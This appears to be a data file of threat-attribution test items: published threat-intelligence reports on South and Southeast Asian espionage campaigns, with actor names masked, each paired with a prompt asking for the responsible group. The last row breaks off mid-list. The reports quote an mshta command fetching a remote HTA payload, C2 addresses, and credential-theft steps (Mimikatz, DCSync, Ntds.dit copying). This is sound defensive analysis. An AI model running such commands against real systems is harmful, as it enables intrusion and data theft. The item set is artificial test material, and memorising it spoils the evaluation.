URL	Text	Prompt
https://www.seqrite.com/blog/sidecopys-multi-platform-onslaught-leveraging-winrar-zero-day-and-linux-variant-of-ares-rat/	SEQRITE Labs APT-Team has discovered multiple campaigns of APT [PLACEHOLDER], targeting Indian government and defense entities in the past few months. The threat group is now exploiting the recent WinRAR vulnerability CVE-2023-38831 (See our advisory for more details) to deploy AllaKore RAT, DRat and additional payloads. The compromised domains, used to host payloads by [PLACEHOLDER], are reused multiple times, resolving to the same IP address. It has also deployed a Linux variant of open-source agent called Ares RAT, where code similarity with its parent threat group Transparent Tribe (APT36) has been found in the stager payload. Conducting multi-platform attacks simultaneously with the same decoys and naming convention, both [PLACEHOLDER] and APT36 share infrastructure and code to aggressively target India.  In this blog, we’ll delve into the technicalities of two such campaigns we encountered during our telemetry analysis. We have observed more similar ongoing campaigns unfold and expect them to continue as the Israel-Hamas conflict intensifies, where not only Pakistan-aligned hacktivists but also other groups against Israel are targeting Indian websites with DDoS, defacement, and data breach attacks.  Threat Actor Profile [PLACEHOLDER] is a Pakistan-linked Advanced Persistent Threat group that has been targeting South Asian countries, primarily the Indian Defense and Afghanistan government entities, since at least 2019. Almost every month, a new attack campaign has been observed this year in our telemetry, with changes over time where additional stages with Double Action RAT, new .NET-based RAT, and TTPs where PowerShell remote execution has been uncovered by our team. Its arsenal includes Action RAT, AllaKore RAT, Reverse RAT, Margulas RAT and more.  This group is associated as a sub-division of Transparent Tribe (APT36), which has been persistently targeting the Indian Military and is continuing to target university students aggressively this year to share student data, possibly with terrorist groups for recruitment. It has updated its Linux malware arsenal this year with Poseidon and other utilities. Active since 2013, it has continuously used payloads such as Crimson RAT, Capra RAT, and Oblique RAT in its campaigns.  Pakistani agents have used honey traps to lure defense personnel, creating an immense impact and damage by stealing confidential intel in this form of cyber espionage.  Analysis of Campaign-1 The first campaign of [PLACEHOLDER] observed is spread via a phishing link that downloads an archive file named “Homosexuality – Indian Armed Forces.” The decoy document is related to NSRO and is called “ACR.pdf” or “ACR_ICR_ECR_Form_for_Endorsement_New_Policy.pdf.”  Interestingly, we found the same decoy PDF is utilized by the Linux variant of Ares RAT, which was first seen in the last week of August on Virus Total. Both the compromised domains used resolved to the same IP address, as shown in the below figure. The domains used in April ‘ssynergy[.]in’ and May ‘elfinindia[.]com’ campaigns also point to the same IP. Moreover, the archive files hosted on different domains have the same name, indicating the reuse of compromised domains.  The phishing URL targeting the Windows platform points to sunfireglobal[.]in, a compromised domain that is not alive at the time of writing, is resolving to the IP: 162.241.85[.]104. URL is:  hxxps://sunfireglobal[.]in/public/core/homo/Homosexuality%20-%20Indian%20Armed%20Forces.zip This contains a malicious shortcut file in a double extension format named “Homosexuality – Indian Armed Forces ․pdf.lnk” that triggers a remote HTA file as:  C:\Windows\System32\mshta.exe “hxxps://sunfireglobal[.]in/public/assests/files/db/acr/” && tar.exe It contains two embedded files that are base64 encoded; one is the decoy PDF, and the other is a DLL. Only minor changes were observed in the HTA, and functionality remains the same – to check the .NET version, fetch the AV installed, decode, and run the DLL in-memory.  After the decoy file is opened by the DLL (preBotHta), it beacons to the same domain and downloads an HTA and the final DLL contents to their target paths. The downloaded HTA is saved as “seqrite.jpg” in the TEMP folder, later moved to the target folder, and executed. Depending on the AV present – SEQRITE, Quick Heal, Kaspersky, Avast, Avira, Bitdefender, and Windows Defender; it executes the final DLL payload.  Legitimate Windows apps like Credential wizard (credwiz.exe) or EFS REKEY wizard (rekeywiz.exe) are copied beside the target to sideload the DLL. Persistence is maintained via Startup (or) Run registry key to load the final RAT payload on system reboot. (Detailed analysis of Action RAT and all other payloads can be found in our previous whitepaper)  Another archive file with the same name, “Homosexuality – Indian Armed Forces.zip,” is seen that contains an ELF file. It is spread using a domain named “occoman[.]com,” resolving to the same IP address for the sunfireglobal[.].in, showing the sharing of IP between compromised domains.  Different file names for this Golang-based Linux malware that is masqueraded as a PDF were found as:  Homosexuality – Indian Armed Forces ․pdf  2023-10-24 Unit Training Program ․pdf 2023-09-20 Social Media Usage ․pptx   2023-08-30 Utilizing the GoReSym plugin with IDA, we can extract function metadata as the binary is stripped (See our in-depth analysis of Go-based Warp malware for plugin details).  The process flow is similar to the first stage seen in the case of the Poseidon agent (observed by Uptycs and Zscaler) having the exact target location, though this stage is not compiled using PyInstaller:  Create a crontab to maintain persistence through system reboot under the current username. Download the decoy to the target directory “/.local/share” and open it. Download the Ares agent as “/.local/share/updates” and execute it.  After extracting the contents of the final PyInstaller payload, two Python-compiled files of our interest (agent.pyc and config.pyc) are retrieved. Decompiling and examining them leads to an open-source Python RAT called Ares.  The URL format used to ping the server is: “hxxps://(host)/api/(uid)/hello.” and it includes the platform, hostname and username of the victim machine along with it. It supports the following 13 commands for C2 communication.  Command  Description upload   Uploads a local file to the server download Downloads a file via HTTP(s) zip   Creates a zip archive of a file or folder cd Change the current directory screenshot  Takes a screenshot and uploads it to the server python   Runs a Python command or a Python file persist  Installs the agent via AutoStart directory clean Uninstalls the agent exit  Kills the agent crack Removes persistence and kills the agent listall  List file directory and upload it to the server help  Display the help <command>   Executes a shell command and returns its output No major changes were observed in the agent apart from changing the name from ares to gedit, and the server used by the agent is present in the config file: 161.97.151[.]200:7015. Both the agent and config scripts include the name ‘lee’ pointing to the same agent as referred by Lumen.  This payload is also named “bossupdate,” a similar naming convention seen with Poseidon and other utilities of Transparent Tribe that starts with the ‘boss’ prefix. APT36 is aiming for the operating system BOSS, developed in India for government entities, and is constantly expanding its Linux arsenal. Back in 2021, [PLACEHOLDER] was linked to the same RAT by QiAnXin’s Red Raindrop Team and a forked version called BackNet by Telsy later.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: SEQRITE Labs APT-Team has discovered multiple campaigns of APT [PLACEHOLDER], targeting Indian government and defense entities in the past few months. The threat group is now exploiting the recent WinRAR vulnerability CVE-2023-38831 (See our advisory for more details) to deploy AllaKore RAT, DRat and additional payloads. The compromised domains, used to host payloads by [PLACEHOLDER], are reused multiple times, resolving to the same IP address. It has also deployed a Linux variant of open-source agent called Ares RAT, where code similarity with its parent threat group Transparent Tribe (APT36) has been found in the stager payload. Conducting multi-platform attacks simultaneously with the same decoys and naming convention, both [PLACEHOLDER] and APT36 share infrastructure and code to aggressively target India.  In this blog, we’ll delve into the technicalities of two such campaigns we encountered during our telemetry analysis. We have observed more similar ongoing campaigns unfold and expect them to continue as the Israel-Hamas conflict intensifies, where not only Pakistan-aligned hacktivists but also other groups against Israel are targeting Indian websites with DDoS, defacement, and data breach attacks.  Threat Actor Profile [PLACEHOLDER] is a Pakistan-linked Advanced Persistent Threat group that has been targeting South Asian countries, primarily the Indian Defense and Afghanistan government entities, since at least 2019. Almost every month, a new attack campaign has been observed this year in our telemetry, with changes over time where additional stages with Double Action RAT, new .NET-based RAT, and TTPs where PowerShell remote execution has been uncovered by our team. Its arsenal includes Action RAT, AllaKore RAT, Reverse RAT, Margulas RAT and more.  This group is associated as a sub-division of Transparent Tribe (APT36), which has been persistently targeting the Indian Military and is continuing to target university students aggressively this year to share student data, possibly with terrorist groups for recruitment. It has updated its Linux malware arsenal this year with Poseidon and other utilities. Active since 2013, it has continuously used payloads such as Crimson RAT, Capra RAT, and Oblique RAT in its campaigns.  Pakistani agents have used honey traps to lure defense personnel, creating an immense impact and damage by stealing confidential intel in this form of cyber espionage.  Analysis of Campaign-1 The first campaign of [PLACEHOLDER] observed is spread via a phishing link that downloads an archive file named “Homosexuality – Indian Armed Forces.” The decoy document is related to NSRO and is called “ACR.pdf” or “ACR_ICR_ECR_Form_for_Endorsement_New_Policy.pdf.”  Interestingly, we found the same decoy PDF is utilized by the Linux variant of Ares RAT, which was first seen in the last week of August on Virus Total. Both the compromised domains used resolved to the same IP address, as shown in the below figure. The domains used in April ‘ssynergy[.]in’ and May ‘elfinindia[.]com’ campaigns also point to the same IP. Moreover, the archive files hosted on different domains have the same name, indicating the reuse of compromised domains.  The phishing URL targeting the Windows platform points to sunfireglobal[.]in, a compromised domain that is not alive at the time of writing, is resolving to the IP: 162.241.85[.]104. URL is:  hxxps://sunfireglobal[.]in/public/core/homo/Homosexuality%20-%20Indian%20Armed%20Forces.zip This contains a malicious shortcut file in a double extension format named “Homosexuality – Indian Armed Forces ․pdf.lnk” that triggers a remote HTA file as:  C:\Windows\System32\mshta.exe “hxxps://sunfireglobal[.]in/public/assests/files/db/acr/” && tar.exe It contains two embedded files that are base64 encoded; one is the decoy PDF, and the other is a DLL. Only minor changes were observed in the HTA, and functionality remains the same – to check the .NET version, fetch the AV installed, decode, and run the DLL in-memory.  After the decoy file is opened by the DLL (preBotHta), it beacons to the same domain and downloads an HTA and the final DLL contents to their target paths. The downloaded HTA is saved as “seqrite.jpg” in the TEMP folder, later moved to the target folder, and executed. Depending on the AV present – SEQRITE, Quick Heal, Kaspersky, Avast, Avira, Bitdefender, and Windows Defender; it executes the final DLL payload.  Legitimate Windows apps like Credential wizard (credwiz.exe) or EFS REKEY wizard (rekeywiz.exe) are copied beside the target to sideload the DLL. Persistence is maintained via Startup (or) Run registry key to load the final RAT payload on system reboot. (Detailed analysis of Action RAT and all other payloads can be found in our previous whitepaper)  Another archive file with the same name, “Homosexuality – Indian Armed Forces.zip,” is seen that contains an ELF file. It is spread using a domain named “occoman[.]com,” resolving to the same IP address for the sunfireglobal[.].in, showing the sharing of IP between compromised domains.  Different file names for this Golang-based Linux malware that is masqueraded as a PDF were found as:  Homosexuality – Indian Armed Forces ․pdf  2023-10-24 Unit Training Program ․pdf 2023-09-20 Social Media Usage ․pptx   2023-08-30 Utilizing the GoReSym plugin with IDA, we can extract function metadata as the binary is stripped (See our in-depth analysis of Go-based Warp malware for plugin details).  The process flow is similar to the first stage seen in the case of the Poseidon agent (observed by Uptycs and Zscaler) having the exact target location, though this stage is not compiled using PyInstaller:  Create a crontab to maintain persistence through system reboot under the current username. Download the decoy to the target directory “/.local/share” and open it. Download the Ares agent as “/.local/share/updates” and execute it.  After extracting the contents of the final PyInstaller payload, two Python-compiled files of our interest (agent.pyc and config.pyc) are retrieved. Decompiling and examining them leads to an open-source Python RAT called Ares.  The URL format used to ping the server is: “hxxps://(host)/api/(uid)/hello.” and it includes the platform, hostname and username of the victim machine along with it. It supports the following 13 commands for C2 communication.  Command  Description upload   Uploads a local file to the server download Downloads a file via HTTP(s) zip   Creates a zip archive of a file or folder cd Change the current directory screenshot  Takes a screenshot and uploads it to the server python   Runs a Python command or a Python file persist  Installs the agent via AutoStart directory clean Uninstalls the agent exit  Kills the agent crack Removes persistence and kills the agent listall  List file directory and upload it to the server help  Display the help <command>   Executes a shell command and returns its output No major changes were observed in the agent apart from changing the name from ares to gedit, and the server used by the agent is present in the config file: 161.97.151[.]200:7015. Both the agent and config scripts include the name ‘lee’ pointing to the same agent as referred by Lumen.  This payload is also named “bossupdate,” a similar naming convention seen with Poseidon and other utilities of Transparent Tribe that starts with the ‘boss’ prefix. APT36 is aiming for the operating system BOSS, developed in India for government entities, and is constantly expanding its Linux arsenal. Back in 2021, [PLACEHOLDER] was linked to the same RAT by QiAnXin’s Red Raindrop Team and a forked version called BackNet by Telsy later.
https://csirt-cti.net/2024/01/23/stately-taurus-targets-myanmar/	The recent ethnic rebel attacks in Myanmar have put the Myanmar junta and surrounding countries on high alert. Since October 2023, a rebel alliance called the Three Brotherhood Alliance (3BHA) has been attacking Myanmar’s military across its northern regions, reportedly seizing its junta outposts and military positions. This activity has been cause of concern to China, as important trade routes have come under control of and have been destroyed by 3BHA, causing China to call for a ceasefire. Following the attacks, a meeting of Myanmar’s National Defence and Security Council (NSDC) on November 8th resulted in the junta leader General Min Aung Hlaing commenting that the country could splinter as a result of the 3BHA offensive. Five days later, martial law was declared across the northern Shan state. While these events do not seem to receive much international attention, the Association of Southeast Asian Nations (ASEAN) defense ministers have been calling for Myanmar to implement the in 2021 established Five-Point Consensus peace plan. So far, Myanmar’s military junta has failed to implement this plan, leading to Myanmar being barred from ASEAN until the plan progresses.    As these developments unfold, CSIRT-CTI has identified two campaigns exhibiting strong indications of being connected to [PLACEHOLDER], both assessed to have targeted the Myanmar Ministry of Defence and Foreign Affairs. Both campaigns strongly appear to leverage techniques, tactics and procedures (TTPs) that are related to both historic and more contemporary Stately Taurus activity. The most prominent of these TTPs are the use of legitimate software including a binary developed by engineering firm Bernecker & Rainer (B&R) and a component of the Windows 10 upgrade assistant to sideload malicious Dynamic-Link Libraries (DLLs). Moreover, a significant number of campaigns attributed to this threat actor have been reported to disguise network traffic by making it appear to be related to Microsoft update traffic.        [PLACEHOLDER] has been performing cyberespionage activities since at least 2012 and is widely believed to be a Chinese Advanced Persistent Threat (APT) tasked with intelligence collection. Previously, attacks targeting government entities and non-profits across North America, Europe and Asia believed to have politically significant information were attributed to this group.    Campaign #1: Analysis of the third meeting of NDSC.zip  The first campaign observed took place on November 9th 2023 and came under our attention after a malicious archive was submitted to VirusTotal with the name Analysis of the third meeting of NDSC.zip. Upon extracting this archive, victims are shown the image in Figure 1 containing a (legitimate, signed) decoy executable and a malicious DLL in the same folder.       Figure 1: Extracted ZIP file containing a decoy executable and malicious DLL  IOC     Value  Analysis of the third meeting of NDSC.zip       b7e042d2accdf4a488c3cd46ccd95d6ad5b5a8be71b5d6d76b8046f17debaa18  Analysis of the third meeting of NDSC.exe       ce4f7e7ce82a5621b5409ccb633e27269a05ce17d1b049feda9fbc4793e6c484  BrMod104.dll    2a00d95b658e11ca71a8de532999dd33ddee7f80432653427eaa885b611ddd87  The executable in this archive is, as mentioned, a legitimate binary originally signed by B&R Industrial Automation GmbH, which points towards engineering firm Bernecker & Rainer. Though the provided certificate expired on May 23rd 2020, it is still considered signed and valid by both Windows and VirusTotal.    Upon execution of the decoy binary, the threat actor leverages DLL Search Order Hijacking to side-load the malicious DLL with a timestamp of 03-11-2023 (shown in Figure 3). After loading the DLL, its first activity is to check for supported languages on the system, after which it performs a check whether persistence has previously been obtained. It does so by determining the presence of command line arguments. If a command line argument is not present, it proceeds by copying itself and the DLL to C:\ProgramData\gameinstall. Once copied, a standard CurrentVersion autorun key is created with the name gameestrto and value C:\\ProgramData\\gameinstall\\Analysis of the third meeting of NDSC.exe starmygame.    \REGISTRY\USER\S-1-5-21-578104441-166916572-4098306029-1000\Software\Microsoft\Windows\CurrentVersion\Run\gameestrto = "C:\\ProgramData\\gameinstall\\Analysis of the third meeting of NDSC.exe starmygame"  This particular command line argument starmygame added to the autorun key is indicative of earlier-achieved persistence, as the malware creates the autorun key to run future executions with this argument. This causing the execution flow to skip over the conditional on address 0x100027ba as shown in Figure 4. Further down the function, any present command line arguments are validated to match the originally set value, which triggers further cryptographic operations leading to C2 communication.    Following the achievement of persistence, preparation is made to ping a C2 server at 123.253.32.15 and register the device. Similar to the campaign described by Lab52, it uses a standard protocol to do so. However, where previously the magic bytes were 17 03 03, these seem to have changed to 46 77 4d. These magic bytes are consistent throughout the requests and responses. This leads to the following protocol:  <46 77 4d>+<payload size>+<payload>.    This standard is used for all communication, even after infection. For the initial connection, the payload is also the similar: <tickcount>+<computername>+<username>. This payload is RC4-encrypted and sent to the C2 server as shown in Figure 6. The threat actors attempt to disguise the traffic as Microsoft update traffic by adding the Host: www.asia.microsoft.com and User-Agent: Windows-Update-Agent headers.    The response of the C2 server to this initial connection is a piece of shellcode that is publicly documented as PUBLOAD. This shellcode, which is also RC4 encrypted, is downloaded as a DAT file and is decrypted to the second stage malware, which is a PlugX implant. Following the Lab52 research, it could be confirmed that the same type of protocol scheme is used for continued communication with the C2 server in this case. This sample too no longer impersonates www.asia.microsoft.com, but switches to www.download.windowsupdate.com the moment it starts taking commands.      IOC     Value  C2 IP address   123.253.32.15  Spoofed Host Header     Host: www.asia.microsoft.com  Spoofed Host Header     www.download.windowsupdate.com  User Agent      Windows-Update-Agent  Autorun key     gameestrto  CLI argument    starmygame  Campaign #2: ASEAN Notes.iso  The second campaign was observed after being uploaded from the US and Myanmar to VirusTotal on January 17th, 2024. In the timeline surrounding the conflict in Myanmar, this is coherent with Myanmar’s junta leader meeting with a special envoy of ASEAN on January 11th in context of the violence in Myanmar. The malware sample involves an Optical Disc Image (ISO) containing LNK shortcuts, extended with a similar but slightly deviating methodology as described in campaign #1. This too matches previously documented [PLACEHOLDER] TTPs aiming at deploying a PlugX implant through multiple stages, though the delivery matches the TONESHELL malware as documented by TrendMicro.    When opening the ISO file, the victim is shown a set of LNK files and a folder structure with multiple layers named _. In addition to the ASEAN 2024.lnk file, the Mofa memo.lnk file potentially refers to the Myanmar Ministry of Foreign Affairs (MOFA), as it aligns with the narrative and is indicative of context. All LNK files (parsed with LnkParse3) are programmed to display a PDF icon to trick the user and start the office.exe binary in the directory structure below. This binary is again legitimate and signed by Microsoft. The hash of this file shows up on VirusTotal as GetCurrentRollback.exe, which is typically present in the Windows 10 Upgrade assistant. After this binary is executed, the same type of DLL side-load is performed as in the first campaign with a DLL-file called GetCurrentDeploy.dll.     This campaign proceeds identical to the TrendMicro analysis and attempts to register the device with C2. The report mentions that TONESHELL supports up to ten C2 addresses and seems to contain two IP addresses in this case (103.159.132.80 and 37.120.222.19). The former is present in the same subnet as is documented by CheckPoint and the latter is resolved from a hardcoded domain name in the binary, openservername.com. Remarkable is that this domain only resolves when a subdomain of www is added.      Upon execution of one of the LNK files, similar steps are taken as in campaign one. It executes the office.exe binary down in the _ directory structure and side-loads GetCurrentDeploy.dll. By doing so, it triggers the same functionality as campaign #1, verifying command line arguments and copying both files to a different directory. The only difference, which is characterising for TONESHELL, is that these copies are dropped in %PUBLIC% instead of C:\ProgramData\gameinstall.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: The recent ethnic rebel attacks in Myanmar have put the Myanmar junta and surrounding countries on high alert. Since October 2023, a rebel alliance called the Three Brotherhood Alliance (3BHA) has been attacking Myanmar’s military across its northern regions, reportedly seizing its junta outposts and military positions. This activity has been cause of concern to China, as important trade routes have come under control of and have been destroyed by 3BHA, causing China to call for a ceasefire. Following the attacks, a meeting of Myanmar’s National Defence and Security Council (NSDC) on November 8th resulted in the junta leader General Min Aung Hlaing commenting that the country could splinter as a result of the 3BHA offensive. Five days later, martial law was declared across the northern Shan state. While these events do not seem to receive much international attention, the Association of Southeast Asian Nations (ASEAN) defense ministers have been calling for Myanmar to implement the in 2021 established Five-Point Consensus peace plan. So far, Myanmar’s military junta has failed to implement this plan, leading to Myanmar being barred from ASEAN until the plan progresses.    As these developments unfold, CSIRT-CTI has identified two campaigns exhibiting strong indications of being connected to [PLACEHOLDER], both assessed to have targeted the Myanmar Ministry of Defence and Foreign Affairs. Both campaigns strongly appear to leverage techniques, tactics and procedures (TTPs) that are related to both historic and more contemporary Stately Taurus activity. The most prominent of these TTPs are the use of legitimate software including a binary developed by engineering firm Bernecker & Rainer (B&R) and a component of the Windows 10 upgrade assistant to sideload malicious Dynamic-Link Libraries (DLLs). Moreover, a significant number of campaigns attributed to this threat actor have been reported to disguise network traffic by making it appear to be related to Microsoft update traffic.        [PLACEHOLDER] has been performing cyberespionage activities since at least 2012 and is widely believed to be a Chinese Advanced Persistent Threat (APT) tasked with intelligence collection. Previously, attacks targeting government entities and non-profits across North America, Europe and Asia believed to have politically significant information were attributed to this group.    Campaign #1: Analysis of the third meeting of NDSC.zip  The first campaign observed took place on November 9th 2023 and came under our attention after a malicious archive was submitted to VirusTotal with the name Analysis of the third meeting of NDSC.zip. Upon extracting this archive, victims are shown the image in Figure 1 containing a (legitimate, signed) decoy executable and a malicious DLL in the same folder.       Figure 1: Extracted ZIP file containing a decoy executable and malicious DLL  IOC     Value  Analysis of the third meeting of NDSC.zip       b7e042d2accdf4a488c3cd46ccd95d6ad5b5a8be71b5d6d76b8046f17debaa18  Analysis of the third meeting of NDSC.exe       ce4f7e7ce82a5621b5409ccb633e27269a05ce17d1b049feda9fbc4793e6c484  BrMod104.dll    2a00d95b658e11ca71a8de532999dd33ddee7f80432653427eaa885b611ddd87  The executable in this archive is, as mentioned, a legitimate binary originally signed by B&R Industrial Automation GmbH, which points towards engineering firm Bernecker & Rainer. Though the provided certificate expired on May 23rd 2020, it is still considered signed and valid by both Windows and VirusTotal.    Upon execution of the decoy binary, the threat actor leverages DLL Search Order Hijacking to side-load the malicious DLL with a timestamp of 03-11-2023 (shown in Figure 3). After loading the DLL, its first activity is to check for supported languages on the system, after which it performs a check whether persistence has previously been obtained. It does so by determining the presence of command line arguments. If a command line argument is not present, it proceeds by copying itself and the DLL to C:\ProgramData\gameinstall. Once copied, a standard CurrentVersion autorun key is created with the name gameestrto and value C:\\ProgramData\\gameinstall\\Analysis of the third meeting of NDSC.exe starmygame.    \REGISTRY\USER\S-1-5-21-578104441-166916572-4098306029-1000\Software\Microsoft\Windows\CurrentVersion\Run\gameestrto = "C:\\ProgramData\\gameinstall\\Analysis of the third meeting of NDSC.exe starmygame"  This particular command line argument starmygame added to the autorun key is indicative of earlier-achieved persistence, as the malware creates the autorun key to run future executions with this argument. This causing the execution flow to skip over the conditional on address 0x100027ba as shown in Figure 4. Further down the function, any present command line arguments are validated to match the originally set value, which triggers further cryptographic operations leading to C2 communication.    Following the achievement of persistence, preparation is made to ping a C2 server at 123.253.32.15 and register the device. Similar to the campaign described by Lab52, it uses a standard protocol to do so. However, where previously the magic bytes were 17 03 03, these seem to have changed to 46 77 4d. These magic bytes are consistent throughout the requests and responses. This leads to the following protocol:  <46 77 4d>+<payload size>+<payload>.    This standard is used for all communication, even after infection. For the initial connection, the payload is also the similar: <tickcount>+<computername>+<username>. This payload is RC4-encrypted and sent to the C2 server as shown in Figure 6. The threat actors attempt to disguise the traffic as Microsoft update traffic by adding the Host: www.asia.microsoft.com and User-Agent: Windows-Update-Agent headers.    The response of the C2 server to this initial connection is a piece of shellcode that is publicly documented as PUBLOAD. This shellcode, which is also RC4 encrypted, is downloaded as a DAT file and is decrypted to the second stage malware, which is a PlugX implant. Following the Lab52 research, it could be confirmed that the same type of protocol scheme is used for continued communication with the C2 server in this case. This sample too no longer impersonates www.asia.microsoft.com, but switches to www.download.windowsupdate.com the moment it starts taking commands.      IOC     Value  C2 IP address   123.253.32.15  Spoofed Host Header     Host: www.asia.microsoft.com  Spoofed Host Header     www.download.windowsupdate.com  User Agent      Windows-Update-Agent  Autorun key     gameestrto  CLI argument    starmygame  Campaign #2: ASEAN Notes.iso  The second campaign was observed after being uploaded from the US and Myanmar to VirusTotal on January 17th, 2024. In the timeline surrounding the conflict in Myanmar, this is coherent with Myanmar’s junta leader meeting with a special envoy of ASEAN on January 11th in context of the violence in Myanmar. The malware sample involves an Optical Disc Image (ISO) containing LNK shortcuts, extended with a similar but slightly deviating methodology as described in campaign #1. This too matches previously documented [PLACEHOLDER] TTPs aiming at deploying a PlugX implant through multiple stages, though the delivery matches the TONESHELL malware as documented by TrendMicro.    When opening the ISO file, the victim is shown a set of LNK files and a folder structure with multiple layers named _. In addition to the ASEAN 2024.lnk file, the Mofa memo.lnk file potentially refers to the Myanmar Ministry of Foreign Affairs (MOFA), as it aligns with the narrative and is indicative of context. All LNK files (parsed with LnkParse3) are programmed to display a PDF icon to trick the user and start the office.exe binary in the directory structure below. This binary is again legitimate and signed by Microsoft. The hash of this file shows up on VirusTotal as GetCurrentRollback.exe, which is typically present in the Windows 10 Upgrade assistant. After this binary is executed, the same type of DLL side-load is performed as in the first campaign with a DLL-file called GetCurrentDeploy.dll.     This campaign proceeds identical to the TrendMicro analysis and attempts to register the device with C2. The report mentions that TONESHELL supports up to ten C2 addresses and seems to contain two IP addresses in this case (103.159.132.80 and 37.120.222.19). The former is present in the same subnet as is documented by CheckPoint and the latter is resolved from a hardcoded domain name in the binary, openservername.com. Remarkable is that this domain only resolves when a subdomain of www is added.      Upon execution of one of the LNK files, similar steps are taken as in campaign one. It executes the office.exe binary down in the _ directory structure and side-loads GetCurrentDeploy.dll. By doing so, it triggers the same functionality as campaign #1, verifying command line arguments and copying both files to a different directory. The only difference, which is characterising for TONESHELL, is that these copies are dropped in %PUBLIC% instead of C:\ProgramData\gameinstall.
https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/	An advanced persistent threat (APT) group suspected with moderate-high confidence to be [PLACEHOLDER] engaged in a number of cyberespionage intrusions targeting a government in Southeast Asia. The intrusions took place from at least the second quarter of 2021 to the third quarter of 2023. Based on our observations and analysis, the attackers gathered and exfiltrated sensitive documents and other types of files from compromised networks.    CL-STA-0044 Details  Reconnaissance  To better understand the breached networks, the threat actor behind CL-STA-0044 scanned infected environments to find live hosts and open ports, as well as existing domain users and domain groups.    We observed the adversary using several different tools to reach these goals:    LadonGo: LadonGo is an open-source scanning framework that Chinese-speaking developers created. The threat actor used LadonGo to scan for live hosts and open ports using commands like smbscan, pingscan and sshscan.  NBTScan: NBTScan is a program for scanning IP networks for NetBIOS name information.  AdFind: AdFind is a command-line query tool that can gather information from Active Directory. The threat actor renamed the tool a.logs.As shown in Figure 2, the threat actor saved the results of AdFind to the following filenames:  Domain_users_light.txt  Domain_computers_light.txt  Domain_groups_light.txt  These filenames have only been mentioned in a GitHub page about “Penetration Testing Methodology References.”    Image 2 is a screenshot of the Cortex XDR program. It is a diagram showing the prevention of AdFind attempts. Some information has been redacted.  Figure 2. Prevention of AdFind attempts to dump domain users’ details.  Impacket: The Impacket collection includes many tools with functions related to remote execution, Kerberos attacks, credential dumping and more. Figure 3 illustrates these commands. The threat actor used Impacket to gather information about the network, discover machines and users, and query directories on remote machines for interesting files to exfiltrate.  Image 3 is a screenshot of reconnaissance commands that were run via Impacket (Python modules). There are six commands in total and some of the information has been redacted.   Figure 3. Reconnaissance commands run via Impacket.  Credential Stealing  Unit 42 researchers observed the threat actor behind the CL-STA-0044 activity attempting to use several techniques for credential stealing to dump passwords from different hosts and the Active Directory:    Hdump: The threat actor deployed and used Hdump.exe (renamed h64.exe), which is a credential stealing utility that researchers have observed Chinese threat actors using. Threat actors used Hdump to dump credentials from memory using the -a (dump all) flag.  Figure 4 shows the help menu of Hdump:    Image 4 is a screenshot of Hdump commands. These options include items such as print, dump user hashes, dump cache hashes and the like.  Figure 4. Hdump help menu.  MimiKatz: The threat actor attempted to dump the memory of lssas.exe several times, using the credential harvesting tool MimiKatz (named l.doc) to extract users’ credentials.  DCSync: The threat actor attempted to use MimiKatz’s DCSync feature, which enables attackers to simulate a domain controller (DC), in the victim’s network to retrieve user credentials from the legitimate DC. They then saved the collected information to a file named log.txt.  Image 5 is a screenshot of the DCSync command. Some of the information has been redacted.  Figure 5. DCSync command.  Stealing the Ntds.dit File: To steal Active Directory data, the threat actor used the Vssadmin tool to create a volume shadow copy of the C:\ drive on the DC. They then retrieved the Ntds.dit file from the shadow copy, as shown in Figure 6.  The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, group membership and (most importantly) password hashes.    The threat actor also stole the SYSTEM file containing the boot key. This key is necessary to decrypt the Ntds.dit file.    Image 6 is a screenshot of commands used to steal the Ntds.dit file. There are four lines in total and some of the information has been redacted.  Figure 6. Stealing the Ntds.dit file.  Abusing Existing Antivirus Software  We observed the threat actor behind the CL-STA-0044 activity abusing existing antivirus software in compromised environments. We spotted threat actors abusing ESET’s Remote Administrator Agent to execute commands on remote hosts and to install backdoors.    They used the process ERAAgent.exe to execute BAT files with a naming pattern of C:\Windows\Temp\ra-run-command-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.bat (where xxx is replaced with random numbers and characters).    These .bat files executed reconnaissance commands and wrote additional backdoors to the disk, as shown in Figure 7. The files appear to be responsible for executing commands initiated by ESET’s Run Command task.         Image 7 is a screenshot of a tree diagram in Cortex XDR. Suspicious activity has been blocked. Some of the information has been redacted.  Figure 7. Blocked suspicious behavior performed by ERAAgent.exe.  Maintaining Access: Web Shells and Backdoors  During this campaign, the threat actor behind CL-STA-0044 used several methods to maintain a foothold in compromised environments. These methods include using multiple backdoors and web shells.    ToneShell Undocumented Variant  One of the popular backdoors the threat actor behind CL-STA-0044 used in this campaign is an undocumented variant of a piece of malware dubbed ToneShell. Trend Micro reported that [PLACEHOLDER] has used this malware.    Unlike the previously reported version of ToneShell, which uses shellcode as the payload of the malware, the new variant’s full functionality is built from three DLL components working in tandem.    Each DLL component has a different purpose:    Persistence component: in charge of persistence for the backdoor and dropping the other components to disk.  Networking component: in charge of command and control (C2) communication.  Functionality component: in charge of executing the different commands of the backdoor.  Furthermore, each component of ToneShell is loaded into a different legitimate process via DLL sideloading. Internal communication between the components is done via the use of pipes.    Comparing the undocumented variant with the previously reported shellcode variant as shown in Figure 8, there is a clear indication of overlap in the codebase and functionality, as well as in the strings. These strings are saved as stack strings in the shellcode variant.    Image 8 is a screenshot of many lines of code. The code is color-coded with light blue, blue and green portions. The different code sections starting from the top are the ToneShell ShellCode variant, and the ToneShell DLL variant. It demonstrates there there is overlap.  Figure 8. ToneShell strings overlap.  The Persistence Component  The persistence component (nw.dll, nw_elf.dll) is sideloaded into PwmTower.exe, a component of Trend Micro’s Password Manager, which is a known security tool.    The persistence component will create a different type of persistence depending on the process’ privileges. If it has sufficient rights, the persistence component will create two types of persistence:    Service named DISMsrv (Dism Images Servicing Utility Service)  Scheduled task named TabletPCInputServices or TabletInputServices  If it does not have sufficient rights, the persistence component will create another two types of persistence:    Registry run key named TabletPCInputServices or TabletInputServices  